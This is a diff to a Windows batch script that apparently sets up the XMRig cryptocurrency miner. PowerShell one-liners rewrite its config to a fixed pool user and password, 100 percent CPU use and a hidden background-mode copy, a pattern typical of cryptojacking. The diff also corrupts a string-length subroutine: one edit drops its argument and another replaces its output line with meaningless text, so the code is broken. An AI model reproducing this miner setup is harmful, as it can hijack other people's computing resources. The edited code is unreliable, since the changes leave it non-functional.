@@ -236,8 +236,8 @@ powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -repl
 powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"prx.na\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
 powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"prx.na\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
 powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
-set LOGFILE2=C:\Users\puncher\jin\xmrig.log
-powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"C:\Users\puncher\jin\xmrig.log\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
+set LOGFILE2=C:\\Users\\puncher\\jin\\xmrig.log
+powershell -Command "$out = cat 'C:\Users\puncher\jin\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"C:\\Users\\puncher\\jin\\xmrig.log\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config.json'"
 copy /Y "C:\Users\puncher\jin\config.json" "C:\Users\puncher\jin\config_background.json" >NUL
 powershell -Command "$out = cat 'C:\Users\puncher\jin\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\Users\puncher\jin\config_background.json'"
 rem preparing script
@@ -303,7 +303,7 @@ echo [*] Setup complete
 exit /b 0
 :strlen string len
 setlocal EnableDelayedExpansion
-set "token=#%~1"
+set "token=#"
 set "len=0"
 for /L %%A in (12 -1 0) do (
 set/A "len|=1<<%%A"
@@ -314,5 +314,5 @@ set/A "len&=~1<<%%A"
 )
 )
 endlocal
-set len
+set =(~1<<%%A)
 exit /b
